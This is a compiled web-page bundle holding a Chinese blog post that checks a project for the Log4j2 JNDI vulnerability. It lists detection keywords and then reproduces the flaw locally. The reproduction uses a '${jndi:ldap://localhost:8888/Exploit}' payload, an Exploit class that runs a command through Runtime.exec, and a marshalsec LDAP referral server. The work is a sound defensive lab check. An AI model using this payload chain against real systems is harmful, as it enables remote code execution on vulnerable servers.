import{_ as s,W as t,X as e,Z as a,$ as o,a0 as c,Y as i,D as p}from"./framework-4b7e9ff4.js";const l={},r=i(`<h1 id="项目log4j漏洞问题排查" tabindex="-1"><a class="header-anchor" href="#项目log4j漏洞问题排查" aria-hidden="true">#</a> 项目log4j漏洞问题排查</h1><h2 id="_1-自检-项目是否存在log4g漏洞" tabindex="-1"><a class="header-anchor" href="#_1-自检-项目是否存在log4g漏洞" aria-hidden="true">#</a> 1. 自检（项目是否存在log4g漏洞）</h2><p><strong>结论：不存在该漏洞</strong></p><ol><li>项目并没有引用到log4g-core</li><li>也没有打印会引起该漏洞的关键字或规则</li></ol><figure><img src="https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222121156841.png" alt="image-20211222121156841" tabindex="0" loading="lazy"><figcaption>image-20211222121156841</figcaption></figure><h3 id="_1-1-针对漏洞的自定义规则" tabindex="-1"><a class="header-anchor" href="#_1-1-针对漏洞的自定义规则" aria-hidden="true">#</a> 1.1 针对漏洞的自定义规则</h3><table><thead><tr><th>规则</th><th>使用情况</th></tr></thead><tbody><tr><td>tcp payload</td><td>未使用</td></tr><tr><td>http msgbody</td><td>未使用</td></tr></tbody></table><h3 id="_1-2-日志排查关键字" tabindex="-1"><a class="header-anchor" href="#_1-2-日志排查关键字" aria-hidden="true">#</a> 1.2 日志排查关键字</h3><table><thead><tr><th>关键字</th><th>使用情况</th></tr></thead><tbody><tr><td>Javax. naming Communicationexception</td><td>未使用</td></tr><tr><td>Javax. naming. Namingexception: problem generating object using object factory</td><td>未使用</td></tr><tr><td>Error looking up JNDI resource&quot;关键字进行排查</td><td>未使用</td></tr><tr><td>\${jndi: ladp或 rmi</td><td>未使用</td></tr><tr><td>getobjectfactoryfromreferenc Idapurl Context hdil ookup等与jnd调用相关的堆栈信息。</td><td>未使用</td></tr></tbody></table><h2 id="_2-log4j漏洞概述" tabindex="-1"><a class="header-anchor" href="#_2-log4j漏洞概述" aria-hidden="true">#</a> 2. log4j漏洞概述</h2><p>该漏洞是由于Apache Log4j2某些功能存在递归解析功能，未经身份验证的攻击者通过发送特定恶意数据包，可在目标服务器上执行任意代码。</p><h2 id="_3-影响范围" tabindex="-1"><a class="header-anchor" href="#_3-影响范围" aria-hidden="true">#</a> 3. 影响范围</h2><p>Apache Log4j 2.x &lt;= 2.15.0-rc1</p><h2 id="_4-复现demo" tabindex="-1"><a class="header-anchor" href="#_4-复现demo" aria-hidden="true">#</a> 4. 复现demo</h2><h3 id="_4-1-新建maven项目" tabindex="-1"><a class="header-anchor" href="#_4-1-新建maven项目" aria-hidden="true">#</a> 4.1 新建maven项目</h3><p>创建一个新的maven项目，并导入Log4j的依赖包</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code> <span class="token comment">&lt;!--   bug版本log4j-core-2.14.1    --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.14.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token comment">&lt;!--   已修复版本log4j-core-2.17.0    --&gt;</span>
<span class="token comment">&lt;!--        &lt;dependency&gt;--&gt;</span>
<span class="token comment">&lt;!--            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;--&gt;</span>
<span class="token comment">&lt;!--            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;--&gt;</span>
<span class="token comment">&lt;!--            &lt;version&gt;2.17.0&lt;/version&gt;--&gt;</span>
<span class="token comment">&lt;!--        &lt;/dependency&gt;--&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_4-2-漏洞利用" tabindex="-1"><a class="header-anchor" href="#_4-2-漏洞利用" aria-hidden="true">#</a> 4.2 漏洞利用</h3><h4 id="_4-2-1-使用poc测试" tabindex="-1"><a class="header-anchor" href="#_4-2-1-使用poc测试" aria-hidden="true">#</a> <strong>4.2.1 使用POC测试</strong></h4><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">LogTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;\${jndi:ldap://localhost:8888/Exploit}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-2-2-编译一恶意类exploit-class" tabindex="-1"><a class="header-anchor" href="#_4-2-2-编译一恶意类exploit-class" aria-hidden="true">#</a> 4.2.2 <strong>编译一恶意类Exploit.class</strong></h4><p>首先新建exp.java，然后编译为class文件</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>err<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Pwned&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> cmds <span class="token operator">=</span> <span class="token string">&quot;calc&quot;</span><span class="token punctuation">;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
javac exp<span class="token punctuation">.</span>java
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-2-3-使用marshalsec-0-0-3-snapshot-all-jar本地开启一个ldap服务" tabindex="-1"><a class="header-anchor" href="#_4-2-3-使用marshalsec-0-0-3-snapshot-all-jar本地开启一个ldap服务" aria-hidden="true">#</a> 4.2.3 <strong>使用marshalsec-0.0.3-SNAPSHOT-all.jar本地开启一个LDAP服务</strong></h4><div class="language-mipsasm line-numbers-mode" data-ext="mipsasm"><pre class="language-mipsasm"><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
&quot;http://127.0.0.1:7777/#Exploit&quot; 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_4-2-3-运行poc-java-即可访问恶意类并执行写在其中的-calc-命令" tabindex="-1"><a class="header-anchor" href="#_4-2-3-运行poc-java-即可访问恶意类并执行写在其中的-calc-命令" aria-hidden="true">#</a> 4.2.3 运行poc.java，即可访问恶意类并执行写在其中的&quot;calc&quot;命令</h4><figure><img src="https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124406317.png" alt="image-20211222124406317" tabindex="0" loading="lazy"><figcaption>image-20211222124406317</figcaption></figure><h3 id="_4-3-验证测试" tabindex="-1"><a class="header-anchor" href="#_4-3-验证测试" aria-hidden="true">#</a> 4.3 验证测试</h3><h4 id="_4-3-1-bug版本log4j-core-2-14-1" tabindex="-1"><a class="header-anchor" href="#_4-3-1-bug版本log4j-core-2-14-1" aria-hidden="true">#</a> 4.3.1 bug版本log4j-core-2.14.1</h4><p>打印的日志会调用jndi</p><figure><img src="https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124709509.png" alt="image-20211222124709509" tabindex="0" loading="lazy"><figcaption>image-20211222124709509</figcaption></figure><figure><img src="https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124917358.png" alt="image-20211222124917358" tabindex="0" loading="lazy"><figcaption>image-20211222124917358</figcaption></figure><h4 id="_4-3-2-已修复版本log4j-core-2-17-0" tabindex="-1"><a class="header-anchor" href="#_4-3-2-已修复版本log4j-core-2-17-0" aria-hidden="true">#</a> 4.3.2 已修复版本log4j-core-2.17.0</h4><p>已修复版本就变成单纯的打印日志了</p><figure><img src="https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222124814229.png" alt="image-20211222124814229" tabindex="0" loading="lazy"><figcaption>image-20211222124814229</figcaption></figure><h2 id="_5-项目验证" tabindex="-1"><a class="header-anchor" href="#_5-项目验证" aria-hidden="true">#</a> 5. 项目验证</h2><p>项目在log 中的jdni，并不会执行远程调用</p><figure><img src="https://zszblog.oss-cn-beijing.aliyuncs.com/zszblog/blogimage-master/image-20211222125006483.png" alt="image-20211222125006483" tabindex="0" loading="lazy"><figcaption>image-20211222125006483</figcaption></figure><h2 id="参考文章" tabindex="-1"><a class="header-anchor" href="#参考文章" aria-hidden="true">#</a> 参考文章</h2>`,39),d={href:"https://segmentfault.com/a/1190000041117219",target:"_blank",rel:"noopener noreferrer"};function u(g,m){const n=p("ExternalLinkIcon");return t(),e("div",null,[r,a("p",null,[a("a",d,[o("手把手复现了 Log4j2 漏洞，太可怕了。。"),c(n)])])])}const k=s(l,[["render",u],["__file","dev-lib-x-log4j-loophole.html.vue"]]);export{k as default};
